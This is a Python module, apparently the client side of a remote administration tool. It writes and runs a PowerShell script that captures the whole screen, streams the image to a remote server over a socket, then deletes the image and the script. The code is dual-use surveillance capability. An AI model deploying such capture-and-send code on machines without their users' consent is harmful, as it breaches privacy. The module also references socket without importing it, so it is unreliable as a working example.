from datetime import datetime
from threading import Thread
import subprocess
import time
import sys
import os


class Screenshot:
    def __init__(self, soc, log_path, hostname, localIP):
        self.ps_path = r'C:\HandsOff\screenshot.ps1'
        self.hostname = hostname
        self.localIP = localIP
        self.log_path = log_path
        self.soc = soc

        self.logIt_thread(self.log_path, msg='Calling get_date()...')
        dt = self.get_date()

        self.logIt_thread(self.log_path, msg='Defining screenshot file name...')
        self.filename = rf"C:\HandsOff\screenshot {self.hostname} {str(self.localIP)} {dt}.jpg"
        self.logIt_thread(self.log_path, msg=f'Screenshot file name: {self.filename}')

    def get_date(self):
        d = datetime.now().replace(microsecond=0)
        dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))

        return dt

    def logIt(self, logfile=None, debug=None, msg=''):
        dt = self.get_date()
        if debug:
            print(f"{dt}: {msg}")

        if logfile is not None:
            try:
                if not os.path.exists(logfile):
                    with open(logfile, 'w') as lf:
                        lf.write(f"{dt}: {msg}\n")
                        return True

                else:
                    with open(logfile, 'a') as lf:
                        lf.write(f"{dt}: {msg}\n")
                    return True

            except FileExistsError:
                pass

    def logIt_thread(self, log_path=None, debug=False, msg=''):
        self.logit_thread = Thread(target=self.logIt, args=(log_path, debug, msg), name="Log Thread")
        self.logit_thread.start()
        return

    def make_script(self):
        self.logIt_thread(self.log_path, msg='Running make_script()...')
        self.logIt_thread(self.log_path, msg=f'Writing script to {self.ps_path}...')
        with open(self.ps_path, 'w') as file:
            file.write("Add-Type -AssemblyName System.Windows.Forms\n")
            file.write("Add-Type -AssemblyName System.Drawing\n\n")
            file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
            file.write("$Width  = $Screen.Width\n")
            file.write("$Height = $Screen.Height\n")
            file.write("$Left = $Screen.Left\n")
            file.write("$Top = $Screen.Top\n\n")
            file.write("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n")
            file.write("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n")
            file.write("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n")
            file.write(rf"$bitmap.Save('{self.filename}')")

        time.sleep(0.2)
        self.logIt_thread(self.log_path, msg=f'Writing script to {self.ps_path} completed.')

    def run_script(self):
        self.logIt_thread(self.log_path, msg='Running run_script()...')
        self.logIt_thread(self.log_path, msg=f'Running PS script...')
        ps = subprocess.Popen(["powershell.exe", rf"{self.ps_path}"], stdout=sys.stdout)
        ps.communicate()
        self.logIt_thread(self.log_path, msg=f'PS script Completed.')

    def send_file(self):
        try:
            # Send filename to server
            self.logIt_thread(self.log_path, msg='Sending file name to server...')
            self.soc.send(f"{self.filename}".encode())
            self.logIt_thread(self.log_path, msg=f'Send Completed.')

            # Receive filename Confirmation from the server
            self.logIt_thread(self.log_path, msg='Waiting for confirmation from server...')
            msg = self.soc.recv(1024).decode()
            self.logIt_thread(self.log_path, msg=f'Server confirmation: {msg}')
            self.logIt_thread(self.log_path, msg=f'Getting file size...')
            length = os.path.getsize(self.filename)
            self.logIt_thread(self.log_path, msg=f'Sending file size to server...')
            self.soc.send(self.convert_to_bytes(length))
            self.logIt_thread(self.log_path, msg=f'Send Completed.')

            # Send file content
            self.logIt_thread(self.log_path, msg=f'Opening {self.filename} with read bytes permissions...')
            with open(self.filename, 'rb') as img_file:
                img_data = img_file.read(1024)
                self.logIt_thread(self.log_path, msg=f'Sending file content...')
                while img_data:
                    self.soc.send(img_data)
                    if not img_data:
                        break

                    img_data = img_file.read(1024)

            self.logIt_thread(self.log_path, msg=f'Send Completed.')

            return

        except (WindowsError, socket.error, ConnectionError) as e:
            self.logIt_thread(self.log_path, msg=f'Connection Error: {e}')
            return False

    def confirm(self):
        try:
            self.logIt_thread(self.log_path, msg=f'Sending confirmation...')
            time.sleep(0.5)
            self.soc.send(f"{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
            self.logIt_thread(self.log_path, msg=f'Send Completed.')

        except (WindowsError, socket.error):
            self.logIt_thread(self.log_path, msg=f'Connection Error')
            return False

    def run(self):
        self.logIt_thread(self.log_path, msg='Running screenshot()...')
        self.logIt_thread(self.log_path, msg='Calling make_script()...')
        self.make_script()
        self.logIt_thread(self.log_path, msg='Calling run_script()...')
        self.run_script()
        self.logIt_thread(self.log_path, msg='Calling send_file()...')
        self.send_file()
        self.logIt_thread(self.log_path, msg='Calling confirm()...')
        self.confirm()

        self.logIt_thread(self.log_path, msg=f'Removing \n{self.filename} | \n{self.ps_path}...')
        os.remove(self.filename)
        os.remove(self.ps_path)
        self.logIt_thread(self.log_path, msg=f'=== End of screenshot() ===')

    def convert_to_bytes(self, no):
        result = bytearray()
        result.append(no & 255)
        for i in range(3):
            no = no >> 8
            result.append(no & 255)

        return result
